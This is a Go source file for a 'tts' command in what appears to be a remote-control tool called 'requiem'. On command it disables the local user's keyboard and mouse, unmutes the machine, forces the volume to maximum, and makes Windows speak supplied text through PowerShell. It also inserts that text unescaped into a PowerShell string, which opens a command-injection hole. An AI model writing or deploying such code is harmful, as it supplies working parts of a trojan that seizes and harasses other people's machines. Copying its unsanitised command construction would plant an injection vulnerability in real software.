package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/settings"
	"requiem/store"
	"requiem/utils"
)

func (*SpeakCommand) Exec(ctx *store.CommandContext, args []string) {
	content := strings.Join(args, " ")
	if len(content) < 1 {
		ctx.ReplyMsg("🟥 You need to provide a message.")
		return
	}

	if settings.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.SetInputsDisabled(true)
	}

	if settings.RuntimeSettings.AudioUnmuteBeforePlay {
		funcs.SetMuted(false)
	}

	if settings.RuntimeSettings.AudioMaxVolumeBeforePlay {
		funcs.SetVolume(1)
	}

	err := utils.RunCommand(
		"powershell",
		"-c",
		fmt.Sprintf("Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('%s')", content),
	)

	if settings.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.SetInputsDisabled(false)
	}

	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to play message - %s", err))
		return
	}

	ctx.ReplyMsg("🟩 Successfully played message.")
}

func (*SpeakCommand) Name() string {
	return "tts"
}

func (*SpeakCommand) Info() string {
	return "Play text to speech audio."
}

type SpeakCommand struct{}
